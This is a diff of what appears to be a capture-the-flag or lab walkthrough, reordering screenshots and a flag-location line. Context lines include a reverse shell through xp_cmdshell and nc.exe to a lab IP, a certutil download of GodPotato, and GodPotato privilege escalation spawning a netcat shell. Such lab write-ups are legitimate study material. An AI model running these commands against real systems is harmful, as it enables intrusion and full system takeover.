@@ -98,12 +98,18 @@ execute xp_cmdshell 'c:\temp\nc.exe 10.10.14.240 80 -e cmd.exe'
 - https://github.com/BeichenDream/GodPotato
 ```powershell
 whoami /all
+```
+<img width="1106" height="238" alt="image" src="https://github.com/user-attachments/assets/8d55b007-5517-4843-a488-2773e35d101d" />
 
+<br>
+<br>
+
+```powershell
 certutil -urlcache -f -split http://10.10.14.240/godpotato.exe
 
 .\godpotato.exe -cmd "c:\temp\nc.exe 10.10.14.240 80 -e cmd.exe"
 ```
-<img width="1106" height="238" alt="image" src="https://github.com/user-attachments/assets/8d55b007-5517-4843-a488-2773e35d101d" />
+<img width="1106" height="517" alt="image" src="https://github.com/user-attachments/assets/bc4a12b3-2496-4887-8ab7-8cafe96dc60f" />
 
 <br>
 <br>
@@ -127,12 +133,12 @@ Get-Content $historyPath
 ---
 ## flag
 - `c:\users\sql_svc\desktop`
-- `c:\users\administrator\deskop`
 <img width="1106" height="244" alt="image" src="https://github.com/user-attachments/assets/2cbe7038-161c-474d-bf9c-6150f3dd0dd3" />
 
 <br>
 <br>
 
+- `c:\users\administrator\deskop`
 <img width="1106" height="244" alt="image" src="https://github.com/user-attachments/assets/08bb407b-661a-4aee-87d9-fc6c9bd3f36e" />
 
 
